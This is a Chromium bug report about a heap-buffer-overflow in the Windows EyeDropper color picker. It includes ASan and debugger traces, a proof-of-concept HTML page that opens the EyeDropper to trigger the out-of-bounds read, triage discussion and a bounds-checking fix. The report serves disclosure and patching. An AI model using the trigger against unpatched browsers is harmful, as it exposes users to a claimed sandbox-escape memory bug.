# SUMMARY: AddressSanitizer: heap-buffer-overflow SkPixmap.cpp:321 in SkPixmap::getColor

| Field | Value |
|-------|-------|
| **Issue ID** | [40057168](https://issues.chromium.org/issues/40057168) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Forms>Color |
| **Platforms** | Windows |
| **Reporter** | m....@gmail.com |
| **Assignee** | io...@microsoft.com |
| **Created** | 2021-09-04 |
| **Bounty** | $20,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4594.0 Safari/537.36

Steps to reproduce the problem:

#TestOn
Windows NT 10.0; Win64; x64
gs://chromium-browser-asan/win32-release_x64/asan-win32-release_x64-916705.zip

#Reproduce
This problem is not stable to reproduce, it may take several attempts.

1. unzip poc.zip,sudo python -m http.server 80
2. chrome --no-sandbox --enable-blink-features=WebCodecs --enable-blink-test-features --disable-extensions --user-data-dir=test1 http://localhost/poc.html
3. wait asan report(60s,If it does not reproduce try again)

What is the expected behavior?

What went wrong?
Type of crash
browser process(SANDBOX ESCAPE!)

Did this work before? N/A 

Chrome version: 94.0.4594.0  Channel: dev
OS Version: 10.0

#Analysis
Come soon

```

#Patch
Not yet

#asan
=================================================================
==11784==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x12e7e12c1cd4 at pc 0x7ffdbc0424f3 bp 0x00b85a5fde10 sp 0x00b85a5fde58
READ of size 4 at 0x12e7e12c1cd4 thread T0
==11784==WARNING: Failed to use and restart external symbolizer!
    #0 0x7ffdbc0424f2 in SkPixmap::getColor C:\b\s\w\ir\cache\builder\src\third_party\skia\src\core\SkPixmap.cpp:321
    #1 0x7ffdd2c48982 in EyeDropperView::OnPaint C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc:227
    #2 0x7ffdc5b13364 in views::View::Paint C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:1185
    #3 0x7ffdc5b1ba6e in views::View::RecursivePaintHelper C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:2443
    #4 0x7ffdc5b1b6fb in views::View::PaintChildren C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:1943
    #5 0x7ffdc5b134b1 in views::View::Paint C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:1191
    #6 0x7ffdc5b1da53 in views::View::PaintFromPaintRoot C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:2450
    #7 0x7ffdc5b6a90c in ui::Layer::PaintContentsToDisplayList C:\b\s\w\ir\cache\builder\src\ui\compositor\layer.cc:1327
    #8 0x7ffdc842aa73 in cc::PictureLayer::Update C:\b\s\w\ir\cache\builder\src\cc\layers\picture_layer.cc:145
    #9 0x7ffdc83c9a6e in cc::LayerTreeHost::DoUpdateLayers C:\b\s\w\ir\cache\builder\src\cc\trees\layer_tree_host.cc:921
    #10 0x7ffdc83c91c6 in cc::LayerTreeHost::UpdateLayers C:\b\s\w\ir\cache\builder\src\cc\trees\layer_tree_host.cc:774
    #11 0x7ffdcb2082a2 in cc::SingleThreadProxy::DoPainting C:\b\s\w\ir\cache\builder\src\cc\trees\single_thread_proxy.cc:911
    #12 0x7ffdcb20a0a1 in cc::SingleThreadProxy::BeginMainFrame C:\b\s\w\ir\cache\builder\src\cc\trees\single_thread_proxy.cc:888
    #13 0x7ffdcb20afe2 in base::internal::Invoker<base::internal::BindState<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\bind_internal.h:690
    #14 0x7ffdc5dcab7a in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:178
    #15 0x7ffdc8775762 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:360
    #16 0x7ffdc8774dc2 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:260
    #17 0x7ffdc5e70346 in base::MessagePumpForUI::DoRunLoop C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:220
    #18 0x7ffdc5e6e598 in base::MessagePumpWin::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc:78
    #19 0x7ffdc8776c65 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:467
    #20 0x7ffdc5d4d603 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:134
    #21 0x7ffdbf28441f in content::BrowserMainLoop::RunMainMessageLoop C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:988
    #22 0x7ffdbf289799 in content::BrowserMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:152
    #23 0x7ffdbf27da96 in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:49
    #24 0x7ffdc1bca100 in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:608
    #25 0x7ffdc1bcc99c in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1104
    #26 0x7ffdc1bcbb83 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:971
    #27 0x7ffdc1bc8606 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:390
    #28 0x7ffdc1bc9648 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:418
    #29 0x7ffdbb73148c in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:172
    #30 0x7ff7609f5b74 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:169
    #31 0x7ff7609f2be8 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:382
    #32 0x7ff760de51af in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #33 0x7ffe3f6b7973 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017973)
    #34 0x7ffe3f97a2f0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005a2f0)

0x12e7e12c1cd4 is located 1236 bytes to the right of 14745600-byte region [0x12e7e04b1800,0x12e7e12c1800)
allocated by thread T0 here:
    #0 0x7ff760a96fdb in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ffdc5e7a836 in base::UncheckedMalloc C:\b\s\w\ir\cache\builder\src\base\process\memory_win.cc:67
    #2 0x7ffdc5d31ffc in base::UncheckedCalloc C:\b\s\w\ir\cache\builder\src\base\process\memory.cc:84
    #3 0x7ffdc658c036 in sk_malloc_flags C:\b\s\w\ir\cache\builder\src\skia\ext\SkMemory_new_handler.cpp:118
    #4 0x7ffdbbf58d32 in SkMallocPixelRef::MakeAllocate C:\b\s\w\ir\cache\builder\src\third_party\skia\src\core\SkMallocPixelRef.cpp:42
    #5 0x7ffdbbdec2aa in SkBitmap::tryAllocPixels C:\b\s\w\ir\cache\builder\src\third_party\skia\src\core\SkBitmap.cpp:265
    #6 0x7ffdbbdeb456 in SkBitmap::allocN32Pixels C:\b\s\w\ir\cache\builder\src\third_party\skia\src\core\SkBitmap.cpp:222
    #7 0x7ffdd2c46f91 in EyeDropperView::ScreenCapturer::OnCaptureResult C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc:92
    #8 0x7ffdcc7fb9aa in webrtc::FallbackDesktopCapturerWrapper::OnCaptureResult C:\b\s\w\ir\cache\builder\src\third_party\webrtc\modules\desktop_capture\fallback_desktop_capturer_wrapper.cc:173
    #9 0x7ffdcc7f9baf in webrtc::BlankDetectorDesktopCapturerWrapper::OnCaptureResult C:\b\s\w\ir\cache\builder\src\third_party\webrtc\modules\desktop_capture\blank_detector_desktop_capturer_wrapper.cc:97
    #10 0x7ffdcc7f8910 in webrtc::ScreenCapturerWinDirectx::CaptureFrame C:\b\s\w\ir\cache\builder\src\third_party\webrtc\modules\desktop_capture\win\screen_capturer_win_directx.cc:160
    #11 0x7ffdd2c46ccd in EyeDropperView::ScreenCapturer::ScreenCapturer C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc:83
    #12 0x7ffdd2c477eb in EyeDropperView::EyeDropperView C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc:141
    #13 0x7ffdcfa41800 in ShowEyeDropper C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view_aura.cc:112
    #14 0x7ffdcb6f45ad in BrowserView::OpenEyeDropper C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_view.cc:3708
    #15 0x7ffdc7f60395 in Browser::OpenEyeDropper C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser.cc:1884
    #16 0x7ffdbf638b69 in content::EyeDropperChooserImpl::Choose C:\b\s\w\ir\cache\builder\src\content\browser\eye_dropper_chooser_impl.cc:59
    #17 0x7ffdbe06c4a5 in blink::mojom::EyeDropperChooserStubDispatch::AcceptWithResponder C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\public\mojom\choosers\color_chooser.mojom.cc:592
    #18 0x7ffdbf6398d6 in blink::mojom::EyeDropperChooserStub<mojo::RawPtrImplRefTraits<blink::mojom::EyeDropperChooser> >::AcceptWithResponder C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\public\mojom\choosers\color_chooser.mojom.h:397
    #19 0x7ffdc6115469 in mojo::InterfaceEndpointClient::HandleValidatedMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:860
    #20 0x7ffdc88b9ac6 in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43
    #21 0x7ffdc6118d4c in mojo::InterfaceEndpointClient::HandleIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:655
    #22 0x7ffdc612d1a9 in mojo::internal::MultiplexRouter::ProcessIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:1099
    #23 0x7ffdc612bf3b in mojo::internal::MultiplexRouter::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:719
    #24 0x7ffdc88b9ac6 in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43
    #25 0x7ffdc6110282 in mojo::Connector::DispatchMessageW C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:546
    #26 0x7ffdc6111acf in mojo::Connector::ReadAllAvailableMessages C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:604
    #27 0x7ffdc6161f56 in mojo::SimpleWatcher::OnHandleReady C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:278

SUMMARY: AddressSanitizer: heap-buffer-overflow C:\b\s\w\ir\cache\builder\src\third_party\skia\src\core\SkPixmap.cpp:321 in SkPixmap::getColor
Shadow bytes around the buggy address:
  0x04c4a0458340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a0458350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a0458360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a0458370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a0458380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x04c4a0458390: fa fa fa fa fa fa fa fa fa fa[fa]fa fa fa fa fa
  0x04c4a04583a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a04583b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a04583c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a04583d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04c4a04583e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==11784==ABORTING

## Attachments

- deleted (application/octet-stream, 0 B)
- [asan.txt](attachments/asan.txt) (text/plain, 10.6 KB)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- [minipoc.html](attachments/minipoc.html) (text/plain, 311 B)
- [patch.diff](attachments/patch.diff) (text/plain, 710 B)

## Timeline

### [Deleted User] (2021-09-04)

[Empty comment from Monorail migration]

### m....@gmail.com (2021-09-04)


It seems that the problem should be here, and the comments also provide some information.
I will compile and debug the version and take a look at it later.
```
third_party/skia/include/core/SkPixmap.h:405
/** Returns readable pixel address at (x, y).

	Input is not validated: out of bounds values of x or y trigger an assert() if
	built with SK_DEBUG defined.

	Will trigger an assert() if SkColorType is not kRGBA_8888_SkColorType or
	kBGRA_8888_SkColorType, and is built with SK_DEBUG defined.

	@param x  column index, zero or greater, and less than width()
	@param y  row index, zero or greater, and less than height()
	@return   readable unsigned 32-bit pointer to pixel at (x, y)
*/
const uint32_t* addr32(int x, int y) const {
	SkASSERT((unsigned)x < (unsigned)fInfo.width());
	SkASSERT((unsigned)y < (unsigned)fInfo.height());
	return (const uint32_t*)((const char*)this->addr32() + (size_t)y * fRowBytes + (x << 2));
}

```

### m....@gmail.com (2021-09-05)

I forgot to say that you need to click the "ggg" button to reproduce the problem. Here is a video to reproduce the problem. I deleted some unchanging frames in the middle. The actual reproduction waited about 10 minutes.

### m....@gmail.com (2021-09-05)

Successfully produced the smallest POC that can be reproduced stably.
Under Windows, it will be triggered stably when the mouse is moved to the taskbar.
```
<!DOCTYPE html>
<html>
<meta charset="utf-8">

<body>
<button id="button_fuzz" onclick="setTimeout(start,400);">ggg</button>
</body>

<script>
async function trigger1() {
	var v1773 = new EyeDropper();
	var v1772 = await v1773.open();
}

function start() {
	trigger1();
}

</script>
</html>
```

### m....@gmail.com (2021-09-06)

The debug version confirmed the problem, here I used a simple patching solution that is to replace SkASSERT with SkASSERT_RELEASE.
Because there is no error handling, it may not be the best solution.

```
[12916:13988:0906/185320.738:FATAL:SkPixmap.cpp(266)] assert((unsigned)y < (unsigned)this->height())
(3274.36a4): Break instruction exception - code 80000003 (first chance)
base!base::debug::BreakDebugger+0x21:
00007ffe`edeff301 cc              int     3

0:000> dv
           this = 0x0000004c`ac9fb200
              x = 0n1373
              y = 0n1440

0:000> dx -r1 (*((skia!SkISize *)0x4cac9fb220))
(*((skia!SkISize *)0x4cac9fb220))                 [Type: SkISize]
    [+0x000] fWidth           : 3440 [Type: int]
    [+0x004] fHeight          : 1440 [Type: int]

0:000> k
 # Child-SP          RetAddr               Call Site
00 0000004c`ac9f8fe0 00007ffe`edc610e3     base!base::debug::BreakDebugger+0x21 [E:\v8\chromium\src\base\debug\debugger_win.cc @ 31] 
01 0000004c`ac9f9010 00007ffe`eb9d36c9     base!logging::LogMessage::~LogMessage+0x6d3 [E:\v8\chromium\src\base\logging.cc @ 894] 
02 0000004c`ac9fa550 00007ffe`ec4a35e8     skia!SkAbort_FileLine+0x109 [E:\v8\chromium\src\skia\ext\google_logging.cc @ 39] 
03 0000004c`ac9fa6f0 00007ffe`ec4a1918     skia!SkPixmap::getColor::<lambda_8>::operator()+0x28 [E:\v8\chromium\src\third_party\skia\src\core\SkPixmap.cpp @ 266] 
04 0000004c`ac9fa720 00007ffe`dca12fee     skia!SkPixmap::getColor+0xc8 [E:\v8\chromium\src\third_party\skia\src\core\SkPixmap.cpp @ 268] 
05 0000004c`ac9fafd0 00007ffe`e4f63a7c     chrome_7ffedbed0000!SkBitmap::getColor+0x2e [E:\v8\chromium\src\third_party\skia\include\core\SkBitmap.h @ 825] 
06 0000004c`ac9fb010 00007ffe`dbb15868     chrome_7ffedbed0000!EyeDropperView::OnPaint+0x59c [E:\v8\chromium\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc @ 227] 
07 0000004c`ac9fb2d0 00007ffe`dbb1ad4f     views!views::View::Paint+0xc28 [E:\v8\chromium\src\ui\views\view.cc @ 1186] 
08 0000004c`ac9fc410 00007ffe`dbb1ab44     views!views::View::RecursivePaintHelper+0x1df [E:\v8\chromium\src\ui\views\view.cc @ 2442] 
09 0000004c`ac9fc4c0 00007ffe`dbb15940     views!views::View::PaintChildren+0x1c4 [E:\v8\chromium\src\ui\views\view.cc @ 1944] 
0a 0000004c`ac9fc580 00007ffe`dbb1c0e3     views!views::View::Paint+0xd00 [E:\v8\chromium\src\ui\views\view.cc @ 1192] 
0b 0000004c`ac9fd6c0 00007ffe`dbb58b01     views!views::View::PaintFromPaintRoot+0xb3 [E:\v8\chromium\src\ui\views\view.cc @ 2452] 
0c 0000004c`ac9fd780 00007ffe`dbc23a1e     views!views::Widget::OnNativeWidgetPaint+0x41 [E:\v8\chromium\src\ui\views\widget\widget.cc @ 1479] 
0d 0000004c`ac9fd7c0 00007ffe`cde2d6b0     views!views::DesktopNativeWidgetAura::OnPaint+0x4e [E:\v8\chromium\src\ui\views\widget\desktop_aura\desktop_native_widget_aura.cc @ 1136] 
0e 0000004c`ac9fd810 00007ffe`cde309ad     aura!aura::Window::Paint+0x40 [E:\v8\chromium\src\ui\aura\window.cc @ 1044] 
0f 0000004c`ac9fd850 00007ffe`e92fd574     aura!aura::Window::OnPaintLayer+0x1d [E:\v8\chromium\src\ui\aura\window.cc @ 1414] 
10 0000004c`ac9fd890 00007ffe`d12c9619     compositor!ui::Layer::PaintContentsToDisplayList+0x324 [E:\v8\chromium\src\ui\compositor\layer.cc @ 1327] 
11 0000004c`ac9fd9f0 00007ffe`d15378d1     cc!cc::PictureLayer::Update+0x499 [E:\v8\chromium\src\cc\layers\picture_layer.cc @ 144] 
12 0000004c`ac9fdb60 00007ffe`d1536871     cc!cc::LayerTreeHost::PaintContent+0x101 [E:\v8\chromium\src\cc\trees\layer_tree_host.cc @ 1550] 
13 0000004c`ac9fdbf0 00007ffe`d1535933     cc!cc::LayerTreeHost::DoUpdateLayers+0xc51 [E:\v8\chromium\src\cc\trees\layer_tree_host.cc @ 921] 
14 0000004c`ac9fde20 00007ffe`d166fe2b     cc!cc::LayerTreeHost::UpdateLayers+0x173 [E:\v8\chromium\src\cc\trees\layer_tree_host.cc @ 774] 
15 0000004c`ac9fdee0 00007ffe`d16711e1     cc!cc::SingleThreadProxy::DoPainting+0x2b [E:\v8\chromium\src\cc\trees\single_thread_proxy.cc @ 911] 
16 0000004c`ac9fdf30 00007ffe`d16736f9     cc!cc::SingleThreadProxy::BeginMainFrame+0x4c1 [E:\v8\chromium\src\cc\trees\single_thread_proxy.cc @ 889] 
17 0000004c`ac9fe010 00007ffe`d1673637     cc!base::internal::FunctorTraits<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),void>::Invoke<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>+0x59 [E:\v8\chromium\src\base\bind_internal.h @ 509] 
18 0000004c`ac9fe070 00007ffe`d167357d     cc!base::internal::InvokeHelper<1,void>::MakeItSo<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>+0x87 [E:\v8\chromium\src\base\bind_internal.h @ 671] 
19 0000004c`ac9fe0e0 00007ffe`d1673505     cc!base::internal::Invoker<base::internal::BindState<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>,void ()>::RunImpl<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),std::__1::tuple<base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>,0,1>+0x6d [E:\v8\chromium\src\base\bind_internal.h @ 721] 
1a 0000004c`ac9fe130 00007ffe`edbc1a97     cc!base::internal::Invoker<base::internal::BindState<void (cc::SingleThreadProxy::*)(const viz::BeginFrameArgs &),base::WeakPtr<cc::SingleThreadProxy>,viz::BeginFrameArgs>,void ()>::RunOnce+0x55 [E:\v8\chromium\src\base\bind_internal.h @ 690] 
1b 0000004c`ac9fe180 00007ffe`eddd8192     base!base::OnceCallback<void ()>::Run+0x77 [E:\v8\chromium\src\base\callback.h @ 100] 
1c 0000004c`ac9fe1d0 00007ffe`ede2b42b     base!base::TaskAnnotator::RunTask+0x4f2 [E:\v8\chromium\src\base\task\common\task_annotator.cc @ 180] 
1d 0000004c`ac9fe350 00007ffe`ede2a9a6     base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x77b [E:\v8\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 361] 
1e 0000004c`ac9fe530 00007ffe`edf172f2     base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x126 [E:\v8\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 260] 
1f 0000004c`ac9fe660 00007ffe`edf15d50     base!base::MessagePumpForUI::DoRunLoop+0xc2 [E:\v8\chromium\src\base\message_loop\message_pump_win.cc @ 220] 
20 0000004c`ac9fe700 00007ffe`ede2bf9f     base!base::MessagePumpWin::Run+0xc0 [E:\v8\chromium\src\base\message_loop\message_pump_win.cc @ 79] 
21 0000004c`ac9fe780 00007ffe`edd5bf2d     base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x29f [E:\v8\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 470] 
22 0000004c`ac9fe840 00007ffe`d7146f1b     base!base::RunLoop::Run+0x2ed [E:\v8\chromium\src\base\run_loop.cc @ 134] 
23 0000004c`ac9fe960 00007ffe`d7156955     content!content::BrowserMainLoop::RunMainMessageLoop+0x16b [E:\v8\chromium\src\content\browser\browser_main_loop.cc @ 990] 
24 0000004c`ac9fe9e0 00007ffe`d7140325     content!content::BrowserMainRunnerImpl::Run+0x115 [E:\v8\chromium\src\content\browser\browser_main_runner_impl.cc @ 152] 
25 0000004c`ac9fea50 00007ffe`d9a98d5a     content!content::BrowserMain+0xe5 [E:\v8\chromium\src\content\browser\browser_main.cc @ 49] 
26 0000004c`ac9fead0 00007ffe`d9a9a909     content!content::RunBrowserProcessMain+0xba [E:\v8\chromium\src\content\app\content_main_runner_impl.cc @ 608] 
27 0000004c`ac9feb50 00007ffe`d9a9a0ce     content!content::ContentMainRunnerImpl::RunBrowser+0x769 [E:\v8\chromium\src\content\app\content_main_runner_impl.cc @ 1104] 
28 0000004c`ac9fef50 00007ffe`d9a97859     content!content::ContentMainRunnerImpl::Run+0x2ce [E:\v8\chromium\src\content\app\content_main_runner_impl.cc @ 971] 
29 0000004c`ac9ff020 00007ffe`d9a97e56     content!content::RunContentProcess+0x429 [E:\v8\chromium\src\content\app\content_main.cc @ 390] 
2a 0000004c`ac9ff270 00007ffe`dbed1377     content!content::ContentMain+0x36 [E:\v8\chromium\src\content\app\content_main.cc @ 418] 
2b 0000004c`ac9ff2b0 00007ff7`4bb56584     chrome_7ffedbed0000!ChromeMain+0x237 [E:\v8\chromium\src\chrome\app\chrome_main.cc @ 172] 
2c 0000004c`ac9ff3e0 00007ff7`4bb51814     chrome!MainDllLoader::Launch+0x284 [E:\v8\chromium\src\chrome\app\main_dll_loader_win.cc @ 169] 
```

### cl...@chromium.org (2021-09-06)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5827746650193920.

### do...@chromium.org (2021-09-06)

Thanks for the report. Does this need no-sandbox to reproduce? I also can't reproduce this on a Mac, and I don't have a Windows computer available to test.

I'm suspecting the eyedropper element here. This looks to me like it could be an overflow in the browser process accessible from web content - at least High severity. The code snippets in question look like they've been around a little while though, and the difficulty which you've found in reproing reliably might suggest a race or the like.

+iopopsec@, can you please take a look? Also +pkasting as an owner of EyeDropperView and masonf who has reviewed some recent CLs in this directory.

[Monorail components: Blink>Forms>Color]

### [Deleted User] (2021-09-06)

[Empty comment from Monorail migration]

### m....@gmail.com (2021-09-06)

re https://crbug.com/chromium/1246631#c7
This issues does not require no-sandbox to reproduce.
Because it can be triggered directly from the render process cause the sandbox escape, I recommend the security level to be critical.


### [Deleted User] (2021-09-06)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### io...@microsoft.com (2021-09-08)

 m.cooolie@ - on what version are you able to repro the issue? I am unable to repro it on Version 95.0.4636.0 (Official Build) canary (64-bit).

Also are you using a multi-monitor setup? I have fixed a crash with a similar call stack (http://crbug.com/1167162) and the fix is available starting with 94.0.4600.0 which is after the version reported in the initial bug description.


### m....@gmail.com (2021-09-09)

re#c11
I am not a multi-monitor. 
I tested that the following 2 versions can be triggered. 
The key to triggering is to move the mouse pointer to the taskbar after clicking.

E:\v8\chromium\src>git rev-parse HEAD
2a799a0db496f3f0eb78c8bc96e13a37a2fcae5b

gs://chromium-browser-asan/win32-release_x64/asan-win32-release_x64-917567

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-09-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/a656373ae7212e0d88474bdec4691a4152452748

commit a656373ae7212e0d88474bdec4691a4152452748
Author: Ionel Popescu <iopopesc@microsoft.com>
Date: Mon Sep 13 17:33:46 2021

Speculative fix for eye dropper getColor crash.

There seems to be a situation where the captured frame coordinates
are different than the ones accessible by moving the mouse.

I am not able to locally reproduce this issue, so I am adding DCHECKs
to validate that the coordinates are correct and I am also handling
the invalid coordinates to prevent invalid memory access.

Bug: 1246631
Change-Id: I915d46a71aa73b5dcf08127d347fdd47c1ddf54c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3152423
Reviewed-by: Mason Freed <masonf@chromium.org>
Commit-Queue: Ionel Popescu <iopopesc@microsoft.com>
Cr-Commit-Position: refs/heads/main@{#920811}

[modify] https://crrev.com/a656373ae7212e0d88474bdec4691a4152452748/chrome/browser/ui/views/eye_dropper/eye_dropper_view.cc


### m....@gmail.com (2021-09-14)

Confirm that the patch is working.

```
[4396:4912:0914/112913.774:FATAL:eye_dropper_view.cc(131)] Check failed: y < frame_.height(). 
(112c.1330): Break instruction exception - code 80000003 (first chance)
*** WARNING: Unable to verify checksum for E:\v8\chromium\src\out\0330_debug\base.dll
base!base::debug::BreakDebugger+0x21:
00007ffd`7d85f231 cc              int     3
0:000> k
 # Child-SP          RetAddr               Call Site
00 000000f5`4b3f99f0 00007ffd`7d5c10e3     base!base::debug::BreakDebugger+0x21 [E:\v8\chromium\src\base\debug\debugger_win.cc @ 31] 
01 000000f5`4b3f9a20 00007ffd`7d5c22cc     base!logging::LogMessage::~LogMessage+0x6d3 [E:\v8\chromium\src\base\logging.cc @ 894] 
02 000000f5`4b3faf60 00007ffd`7d52b0bf     base!logging::LogMessage::~LogMessage+0x2c [E:\v8\chromium\src\base\logging.cc @ 583] 
03 000000f5`4b3fafb0 00007ffd`740a2e26     base!logging::CheckError::~CheckError+0x2f [E:\v8\chromium\src\base\check.cc @ 107] 
04 000000f5`4b3faff0 00007ffd`740a3c68     chrome_7ffd6b010000!EyeDropperView::ScreenCapturer::GetColor+0x136 [E:\v8\chromium\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc @ 132] 
05 000000f5`4b3fb080 00007ffd`6ac55868     chrome_7ffd6b010000!EyeDropperView::OnPaint+0x5b8 [E:\v8\chromium\src\chrome\browser\ui\views\eye_dropper\eye_dropper_view.cc @ 235] 
06 000000f5`4b3fb350 00007ffd`6ac5ad4f     views!views::View::Paint+0xc28 [E:\v8\chromium\src\ui\views\view.cc @ 1186] 
07 000000f5`4b3fc490 00007ffd`6ac5ab44     views!views::View::RecursivePaintHelper+0x1df [E:\v8\chromium\src\ui\views\view.cc @ 2442] 
08 000000f5`4b3fc540 00007ffd`6ac55940     views!views::View::PaintChildren+0x1c4 [E:\v8\chromium\src\ui\views\view.cc @ 1944] 
09 000000f5`4b3fc600 00007ffd`6ac5c0e3     views!views::View::Paint+0xd00 [E:\v8\chromium\src\ui\views\view.cc @ 1192] 
0a 000000f5`4b3fd740 00007ffd`6ac98b01     views!views::View::PaintFromPaintRoot+0xb3 [E:\v8\chromium\src\ui\views\view.cc @ 2452] 
